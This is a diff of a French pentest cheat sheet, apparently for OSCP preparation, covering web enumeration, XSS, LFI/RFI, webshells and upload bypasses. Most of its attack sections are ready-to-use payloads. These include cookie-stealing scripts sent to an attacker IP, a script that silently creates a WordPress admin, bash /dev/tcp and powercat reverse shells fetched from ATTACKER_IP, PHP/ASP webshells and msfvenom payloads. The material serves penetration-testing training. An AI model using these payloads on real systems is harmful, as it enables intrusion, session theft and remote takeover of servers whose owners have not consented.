@@ -11,7 +11,7 @@ Examiner les fonctionnalités, entrées et configurations des applications web.
 ### Identification des technologies
 
 
-Commande `whatweb` pour la rubrique « Identification des technologies ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil whatweb.</p>
 
 ```bash
 # Detect technologies used by the target website
@@ -30,7 +30,7 @@ openssl s_client -connect <target_domain>:443
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 # When discovering an HTTP website, test various HTTP methods to identify potential vulnerabilities. Use the following command to enumerate allowed methods:
@@ -41,7 +41,7 @@ curl -X POST http://[TARGET_IP]/[endpoint] -d "test=data"
 ```
 
 
-Commande `wappalyzer` pour la rubrique « Identification des technologies ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil wappalyzer.</p>
 
 ```bash
 # Use Wappalyzer to identify technologies and frameworks
@@ -58,7 +58,7 @@ curl -I http://[TARGET_IP]
 #### FFUF
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 # Basic directory fuzzing
@@ -97,7 +97,7 @@ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ
 #### DIRB
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 # Basic directory scanning
@@ -129,7 +129,7 @@ dirb http://target.com
 #### GOBUSTER
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 # Basic directory scanning
@@ -159,7 +159,7 @@ gobuster dir -u http://192.168.196.199 -w /usr/share/wordlists/dirbuster/directo
 #### FEROXBUSTER
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 # Basic directory fuzzing
@@ -177,7 +177,7 @@ feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list
 #### DIRSEARCH
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 # Basic directory scanning
@@ -213,7 +213,7 @@ dirsearch -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowerc
 #### WFUZZ
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 # Find available directories
@@ -242,7 +242,7 @@ wfuzz --hc 404 -c -t <number_of_threads> -w /usr/share/dirbuster/wordlists/direc
 #### FFUF
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 # Basic file fuzzing
@@ -268,7 +268,7 @@ ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080
 #### DIRB
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 # Basic file scanning with default extensions
@@ -291,7 +291,7 @@ dirb https://target /path/to/wordlist.txt -X .php,.html,.txt
 #### GOBUSTER
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 # Basic file scanning
@@ -317,7 +317,7 @@ gobuster dir -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080
 #### FEROXBUSTER
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 # Basic file scanning
@@ -349,7 +349,7 @@ feroxbuster -u http://target -w /path/to/wordlist.txt -a "Mozilla/5.0"
 #### DIRSEARCH
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 # Basic file scanning
@@ -379,7 +379,7 @@ dirsearch -u http://target -w /path/to/wordlist.txt -x http://127.0.0.1:8080
 `.git` (métadonnées Git)  
 
 
-Commande `git-dumper` pour la rubrique « Dépôt Git exposé ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil git-dumper.</p>
 
 ```bash
 # Dump the contents of an exposed .git directory
@@ -404,7 +404,7 @@ git show [commitID]
 `gitdumper.sh` · `extractor.sh`  
 
 
-Commande `./gitdumper.sh` pour la rubrique « Dépôt Git exposé ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ./gitdumper.sh.</p>
 
 ```bash
 ./gitdumper.sh http://[domain].com/.git/ /path/to/save/git
@@ -428,7 +428,7 @@ git reset --hard
 Examiner les entrées et les réponses de l'application web.
 
 
-Commande `wpscan` pour la rubrique « CMS ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil wpscan.</p>
 
 ```bash
 # Basic WordPress scan
@@ -436,22 +436,16 @@ wpscan --url http://$IP/wp/
 ```
 
 
-Commande `wpscan` pour la rubrique « CMS ».
-
 ```bash
 # Brute forcing WordPress login
 wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
 ```
 
 
-Commande `wpscan` pour la rubrique « CMS ».
-
 ```bash
 wpscan -u "http://<IP>/" --wp-content-dir "<custom-path>"
 ```
 
-
-Commande `wpscan` pour la rubrique « CMS ».
 
 ```bash
 wpscan -u "http://<IP>/" --enumerate u
@@ -461,7 +455,7 @@ wpscan -u "http://<IP>/" --username <username> -w /usr/share/SecList/Usernames/x
 ```
 
 
-Commande `https` pour la rubrique « CMS ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil https.</p>
 
 ```bash
 # Using a malicious WordPress plugin
@@ -475,7 +469,7 @@ python3 wordpwn.py 192.168.119.140 443 Y
 ```
 
 
-Commande `droopescan` pour la rubrique « CMS ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil droopescan.</p>
 
 ```bash
 # Scan Drupal CMS
@@ -483,7 +477,7 @@ droopescan scan drupal -u [TARGET_URL]
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 # Download the .git directory if exposed
@@ -497,7 +491,7 @@ sudo git show
 ```
 
 
-Exemple technique pour la rubrique « CMS ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « CMS ».</p>
 
 ```text
 # Location and version info
@@ -513,14 +507,14 @@ https://www.exploit-db.com/exploits/48979
 ```
 
 
-Commande `cewl` pour la rubrique « CMS ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil cewl.</p>
 
 ```bash
 cewl -w <dictionary-file> "http://<IP>/" --with-numbers
 ```
 
 
-Commande `wpscan` pour la rubrique « CMS ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil wpscan.</p>
 
 ```bash
 # Detect vulnerable plugins
@@ -539,7 +533,7 @@ wpscan --url http(s)://<IP>/ --enumerate p --plugins-detection aggressive
 Examiner les entrées et les réponses de l'application web.
 
 
-Commande `80/tcp` pour la rubrique « WebDav ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil 80/tcp.</p>
 
 ```bash
 80/tcp    open  http          Microsoft IIS httpd 10.0
@@ -549,7 +543,7 @@ Commande `80/tcp` pour la rubrique « WebDav ».
 ```
 
 
-Commande `cadaver` pour la rubrique « WebDav ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil cadaver.</p>
 
 ```bash
 # Use cadaver
@@ -557,28 +551,28 @@ cadaver [IP]
 ```
 
 
-Commande `msfvenom` pour la rubrique « WebDav ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>
 ```
 
 
-Tester ou établir une connexion réseau avec Netcat.
+<p class="oscp-command-note">Tester ou établir une connexion réseau avec Netcat.</p>
 
 ```bash
 nc -nvlp 80
 ```
 
 
-Commande `http` pour la rubrique « WebDav ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```text
 http://$VictimIP/shell.aspx
@@ -588,7 +582,7 @@ http://$VictimIP/shell.aspx
 ### APIs
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 # Basic API exploration
@@ -623,21 +617,17 @@ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/j
 ### Listes de mots
 
 
-Exemple technique pour la rubrique « Listes de mots ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Listes de mots ».</p>
 
 ```text
 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
 
-Exemple technique pour la rubrique « Listes de mots ».
-
 ```text
 /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 ```
 
-
-Exemple technique pour la rubrique « Listes de mots ».
 
 ```text
 /usr/share/seclists/Discovery/Web-Content/common.txt
@@ -648,7 +638,7 @@ Exemple technique pour la rubrique « Listes de mots ».
 `/usr/share/seclists/Discovery/Web-Content/big.txt`  
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 # Get the website content
@@ -674,7 +664,7 @@ Examiner les entrées et les réponses de l'application web.
 ### Theory
 
 
-Exemple technique pour la rubrique « Theory ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Theory ».</p>
 
 ```text
 < > ' " { } ;
@@ -693,7 +683,7 @@ Exemple technique pour la rubrique « Theory ».
 ### Stored
 
 
-Exemple technique pour la rubrique « Stored ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Stored ».</p>
 
 ```html
 # Text to save to the application.
@@ -708,7 +698,7 @@ Exemple technique pour la rubrique « Stored ».
 ### Reflected
 
 
-Commande `http` pour la rubrique « Reflected ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```bash
 http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
@@ -722,7 +712,7 @@ http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/s
 ### Blind
 
 
-Exemple technique pour la rubrique « Blind ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Blind ».</p>
 
 ```html
 <script src=http://[OUR_IP]></script>
@@ -740,7 +730,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 ### PrivEsc Using Session Hijacking
 
 
-Commande `document.location` pour la rubrique « PrivEsc Using Session Hijacking ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil document.location.</p>
 
 ```html
 # Possible Payloads
@@ -753,7 +743,7 @@ new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 ```
 
 
-Exemple technique pour la rubrique « PrivEsc Using Session Hijacking ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « PrivEsc Using Session Hijacking ».</p>
 
 ```php
 # Payload
@@ -779,7 +769,7 @@ if (isset($_GET['c'])) {
 Examiner les entrées et les réponses de l'application web.
 
 
-Commande `var` pour la rubrique « Wordpress HttpOnly Cookie (Visitor Plugin) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil var.</p>
 
 ```php
 var request = new XMLHttpRequest();
@@ -792,7 +782,14 @@ var nonce = match[1];
 ```
 
 
-Commande `var` pour la rubrique « Wordpress HttpOnly Cookie (Visitor Plugin) ».
+```php
+var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
+var request = new XMLHttpRequest();
+request.open("POST", targetURL, true);
+request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+request.send(params);
+```
+
 
 ```php
 var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
@@ -803,18 +800,7 @@ request.send(params);
 ```
 
 
-Commande `var` pour la rubrique « Wordpress HttpOnly Cookie (Visitor Plugin) ».
-
-```php
-var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
-var request = new XMLHttpRequest();
-request.open("POST", targetURL, true);
-request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-request.send(params);
-```
-
-
-Commande `function` pour la rubrique « Wordpress HttpOnly Cookie (Visitor Plugin) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil function.</p>
 
 ```javascript
 function toJavaScriptEncoding(str) {
@@ -837,7 +823,7 @@ console.log(encodedPayload);
 `eval`  
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl -i http://example.com --user-agent "<script>eval(String.fromCharCode(<resultFromRunningAboveScritpToEncode>))</script>" --proxy 127.0.0.1:8080
@@ -847,7 +833,7 @@ curl -i http://example.com --user-agent "<script>eval(String.fromCharCode(<resul
 ### Automated Découverte
 
 
-Commande `git` pour la rubrique « Automated Découverte ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil git.</p>
 
 ```bash
 git clone https://github.com/s0md3v/XSStrike.git
@@ -862,7 +848,7 @@ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
 `user-agent`  
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 # [xss.req] is the request captured from BurpSuite.
@@ -883,14 +869,14 @@ Examiner les entrées et les réponses de l'application web.
 #### Détection de LFI
 
 
-Commande `http` pour la rubrique « Détection de LFI ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```text
 http://<target_url>/file.php?recurse=<file_name>
 ```
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
@@ -901,14 +887,12 @@ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_
 `GET`  
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
 ```
 
-
-Rechercher des chemins ou paramètres web.
 
 ```bash
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
@@ -919,14 +903,12 @@ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:
 `../../../../`  
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
 ```
 
-
-Rechercher des chemins ou paramètres web.
 
 ```bash
 ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
@@ -936,7 +918,7 @@ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?langua
 #### Bypassing LFI Protections
 
 
-Commande `http` pour la rubrique « Bypassing LFI Protections ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```bash
 # URL encoding bypass
@@ -970,7 +952,7 @@ http://<target_url>/file.php?recurse=../../../../../proc/self/environ
 #### LFI Wrappers
 
 
-Commande `http` pour la rubrique « LFI Wrappers ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```bash
 http://<target_url>/file.php?recurse=php://filter/convert.base64-encode/resource=<file_name>
@@ -980,14 +962,12 @@ echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
 ```
 
 
-Commande `http` pour la rubrique « LFI Wrappers ».
-
 ```bash
 http://<target_url>/file.php?recurse=php://filter/read=string.rot13/resource=<file_name>
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"
@@ -1001,21 +981,21 @@ curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource
 `/var/log/apache2/access.log` · `/var/log/auth.log`  
 
 
-Commande `http` pour la rubrique « Log Poisoning (Apache or SSH Logs) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```bash
 http://<target_url>/file.php?recurse=../../../../../var/log/apache2/access.log
 ```
 
 
-Exécuter une commande distante via SSH.
+<p class="oscp-command-note">Exécuter une commande distante via SSH.</p>
 
 ```bash
 ssh "<?php system('whoami'); ?>"@<target>
 ```
 
 
-Commande `http` pour la rubrique « Log Poisoning (Apache or SSH Logs) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```bash
 http://<target_url>/file.php?recurse=../../../../../var/log/auth.log
@@ -1031,14 +1011,14 @@ Examiner les entrées et les réponses de l'application web.
 `/etc/passwd`  
 
 
-Commande `telnet` pour la rubrique « Mail PHP Execution (RCE via Email) ».
+<p class="oscp-command-note">Tester une connexion au port indiqué avec Telnet.</p>
 
 ```bash
 telnet <target_ip> 25
 ```
 
 
-Commande `helo` pour la rubrique « Mail PHP Execution (RCE via Email) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil helo.</p>
 
 ```bash
 HELO localhost
@@ -1050,7 +1030,7 @@ DATA
 ```
 
 
-Commande `smtp-user-enum` pour la rubrique « Mail PHP Execution (RCE via Email) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil smtp-user-enum.</p>
 
 ```bash
 smtp-user-enum -M VRFY -U <username_list> -t <target_ip>
@@ -1064,14 +1044,14 @@ smtp-user-enum -M VRFY -U <username_list> -t <target_ip>
 `/proc/self/environ`  
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl -X POST -d "cmd=<?php system('bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'); ?>" http://<target_url>/file.php?recurse=../../../../../proc/self/environ
 ```
 
 
-Commande `http` pour la rubrique « Reverse Shell via LFI ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```bash
 http://<target_url>/file.php?recurse=../../../../../proc/self/environ
@@ -1081,14 +1061,14 @@ http://<target_url>/file.php?recurse=../../../../../proc/self/environ
 #### Outils utiles
 
 
-Commande `git` pour la rubrique « Outils utiles ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil git.</p>
 
 ```bash
 git clone https://github.com/D35m0nd142/LFISuite
 ```
 
 
-Commande `python` pour la rubrique « Outils utiles ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil python.</p>
 
 ```bash
 python rfiscanner.py <target_url>
@@ -1103,7 +1083,7 @@ Examiner les entrées et les réponses de l'application web.
 #### De base RFI Example
 
 
-Commande `http` pour la rubrique « De base RFI Example ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```bash
 # This assumes the server's allow_url_fopen or allow_url_include settings are enabled.
@@ -1114,7 +1094,7 @@ http://<target_url>/file.php?recurse=http://<attacker_ip>/malicious.php
 #### Reverse Shell via RFI
 
 
-Commande `python3` pour la rubrique « Reverse Shell via RFI ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
 
 ```bash
 python3 -m http.server 80
@@ -1125,7 +1105,7 @@ python3 -m http.server 80
 `revshell.php`  
 
 
-Exemple technique pour la rubrique « Reverse Shell via RFI ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Reverse Shell via RFI ».</p>
 
 ```bash
 # Option 1: Reverse Shell via PHP
@@ -1136,7 +1116,7 @@ bash -c "sh -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1"
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl "http://<TARGET>/index.php?page=http://<ATTACKER_IP>/revshell.php&cmd=ls"
@@ -1146,7 +1126,7 @@ curl "http://<TARGET>/index.php?page=http://<ATTACKER_IP>/revshell.php&cmd=ls"
 ### WordPress Plugin for Reverse Shell
 
 
-Commande `http` pour la rubrique « WordPress Plugin for Reverse Shell ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```text
 http://[IP]/[cms-path]/wp-content/nonexistent?cmd=[command]
@@ -1162,7 +1142,7 @@ http://[IP]/[cms-path]/wp-content/nonexistent?cmd=[command]
 Examiner les entrées et les réponses de l'application web.
 
 
-Exemple technique pour la rubrique « PHP Webshell ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « PHP Webshell ».</p>
 
 ```php
 <?php system($_GET['cmd']); ?>
@@ -1174,7 +1154,7 @@ Exemple technique pour la rubrique « PHP Webshell ».
 Examiner les entrées et les réponses de l'application web.
 
 
-Exemple technique pour la rubrique « ASP Webshell ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « ASP Webshell ».</p>
 
 ```text
 <% eval request('cmd') %>
@@ -1186,7 +1166,7 @@ Exemple technique pour la rubrique « ASP Webshell ».
 Vérifier les ports et les services de la cible autorisée.
 
 
-Commande `msfvenom` pour la rubrique « Non-Meterpreter Payload for Netcat ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil msfvenom.</p>
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT>
@@ -1198,7 +1178,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT>
 Examiner les permissions et la configuration de Linux.
 
 
-Commande `/etc/passwd` pour la rubrique « Fichiers Linux courants ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil /etc/passwd.</p>
 
 ```bash
 # Popular Files
@@ -1236,7 +1216,7 @@ Commande `/etc/passwd` pour la rubrique « Fichiers Linux courants ».
 Observer les permissions et la configuration de Windows.
 
 
-Commande `c` pour la rubrique « Fichiers Windows courants ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
 
 ```bash
 # Popular Files
@@ -1334,7 +1314,7 @@ Examiner les entrées et les réponses de l'application web.
 `php://filter`  
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"
@@ -1348,7 +1328,7 @@ echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
 `php://data`  
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl "http://<TARGET>/index.php?page=data://text/plain,<PHP_PAYLOAD>"
@@ -1363,21 +1343,21 @@ echo -n '<?php echo system($_GET["cmd"]); ?>' | base64
 Examiner les entrées et les réponses de l'application web.
 
 
-Exemple technique pour la rubrique « OS Command Injection ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « OS Command Injection ».</p>
 
 ```powershell
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
 
 
-Commande `iex` pour la rubrique « OS Command Injection ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil iex.</p>
 
 ```powershell
 IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p <PORT> -e powershell
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%20<PORT>%20-e%20powershell' http://<TARGET>:<PORT>/archive
@@ -1400,7 +1380,7 @@ Examiner les entrées et les réponses de l'application web.
 `ffuf` · `BurpSuite`  
 
 
-Commande `.jpeg.php` pour la rubrique « Extensions Blacklist ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil .jpeg.php.</p>
 
 ```text
 .jpeg.php
@@ -1430,7 +1410,7 @@ Commande `.jpeg.php` pour la rubrique « Extensions Blacklist ».
 ### Extensions Whitelist
 
 
-Exemple technique pour la rubrique « Extensions Whitelist ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Extensions Whitelist ».</p>
 
 ```bash
 # This only checks if the whitelist are there in the file upload and not if it ends with it.
@@ -1446,7 +1426,7 @@ if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
 ### Bypassing Filters
 
 
-Commande `.php` pour la rubrique « Bypassing Filters ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil .php.</p>
 
 ```text
 # For PHP
@@ -1461,7 +1441,7 @@ Commande `.php` pour la rubrique « Bypassing Filters ».
 `.htaccess`  
 
 
-Commande `addtype` pour la rubrique « Bypassing Filters ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil addtype.</p>
 
 ```text
 AddType application/x-httpd-php .dork
@@ -1472,7 +1452,7 @@ AddType application/x-httpd-php .dork
 `.dork`  
 
 
-Commande `echo` pour la rubrique « Bypassing Filters ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
 
 ```bash
 # We can now upload [file].dork files.
@@ -1484,7 +1464,7 @@ echo "AddType application/x-httpd-php .dork" > .htaccess
 `shell.php.jpg` · `shell.php.jpeg`  
 
 
-Commande `if` pour la rubrique « Bypassing Filters ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil if.</p>
 
 ```bash
 # This checks if it ends with it so double extension wont work.
@@ -1492,14 +1472,14 @@ if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
 ```
 
 
-Commande `shell.php` pour la rubrique « Bypassing Filters ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil shell.php.</p>
 
 ```text
 shell.php%00.jpg
 ```
 
 
-Exemple technique pour la rubrique « Bypassing Filters ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Bypassing Filters ».</p>
 
 ```text
 # For example shell.php%00.jpg works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the '%00', and store it as 'shell.php'.
@@ -1515,7 +1495,7 @@ Exemple technique pour la rubrique « Bypassing Filters ».
 ```
 
 
-Commande `for` pour la rubrique « Bypassing Filters ».
+<p class="oscp-command-note">Exécuter la boucle de vérification des hôtes.</p>
 
 ```bash
 # Script for all permutations
@@ -1530,7 +1510,7 @@ done
 ```
 
 
-Commande `gif89a` pour la rubrique « Bypassing Filters ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil gif89a.</p>
 
 ```php
 # Payload code
@@ -1546,7 +1526,7 @@ system($_GET['cmd']); //or you can insert your complete shell code
 ```
 
 
-Commande `echo` pour la rubrique « Bypassing Filters ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
 
 ```bash
 # Example
@@ -1570,7 +1550,7 @@ if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))
 ### File Execution
 
 
-Commande `http` pour la rubrique « File Execution ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil http.</p>
 
 ```bash
 http://[TARGET_IP]/uploads/shell.php
@@ -1586,7 +1566,7 @@ http://[TARGET_IP]/uploads/shell.php?cmd=whoami
 `exiftool`  
 
 
-Commande `exiftool` pour la rubrique « Embed Code into Images ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil exiftool.</p>
 
 ```bash
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
@@ -1598,7 +1578,7 @@ mv lo.jpg lo.php.jpg
 ### Embed Code into File Names
 
 
-Commande `file` pour la rubrique « Embed Code into File Names ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil file.</p>
 
 ```text
 file$(whoami).jpg
@@ -1609,14 +1589,14 @@ file$(whoami).jpg
 `whoami.jpg`  
 
 
-Commande `file.jpg` pour la rubrique « Embed Code into File Names ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil file.jpg.</p>
 
 ```text
 file.jpg||whoami
 ```
 
 
-Commande `echo` pour la rubrique « Embed Code into File Names ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
 
 ```text
 # Crate the Base64 encoded command.
@@ -1640,7 +1620,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 ##### Connexion initiale
 
 
-Commande `mysql` pour la rubrique « Connexion initiale ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mysql.</p>
 
 ```bash
 mysql -u <username> -p -h <host>
@@ -1652,21 +1632,21 @@ mysql -u <username> -p -h <host>
 ##### Requêtes courantes
 
 
-Commande `select` pour la rubrique « Requêtes courantes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
 
 ```sql
 SELECT VERSION();
 ```
 
 
